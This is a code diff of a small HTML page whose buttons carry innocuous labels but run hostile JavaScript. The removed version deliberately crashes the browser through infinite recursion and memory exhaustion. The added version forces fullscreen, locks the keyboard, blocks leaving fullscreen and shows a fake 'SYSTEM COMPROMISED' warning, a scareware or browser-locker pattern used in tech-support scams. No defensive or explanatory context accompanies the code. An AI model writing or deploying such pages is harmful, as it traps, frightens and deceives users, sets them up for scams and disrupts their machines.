@@ -1,26 +1,32 @@
 <!DOCTYPE html>
 <html>
 <body>
-<button onclick="magic3()">Load Important Data</button>
+<button onclick="magic5()">Enter Fullscreen Mode</button>
 
 <script>
-function magic3() {
-    // Recursive function yang cause stack overflow
-    function crash() {
-        crash();
-    }
+async function magic5() {
+    // Request fullscreen
+    await document.documentElement.requestFullscreen();
     
-    // Multiple approach crash
+    // Lock keyboard (experimental API)
     try {
-        // Method 1: Stack overflow
-        crash();
-    } catch(e) {
-        // Method 2: Memory exhaustion
-        const arr = [];
-        while(true) {
-            arr.push(new Array(1000000));
+        await navigator.keyboard.lock();
+    } catch(e) {}
+    
+    // Prevent escape
+    document.addEventListener('fullscreenchange', () => {
+        if (!document.fullscreenElement) {
+            document.documentElement.requestFullscreen();
         }
-    }
+    });
+    
+    // Show scary message
+    document.body.innerHTML = `
+        <div style="width:100vw;height:100vh;background:black;color:red;display:flex;align-items:center;justify-content:center;font-size:30px;">
+            SYSTEM COMPROMISED<br>
+            DO NOT CLOSE THIS WINDOW
+        </div>
+    `;
 }
 </script>
 </body>
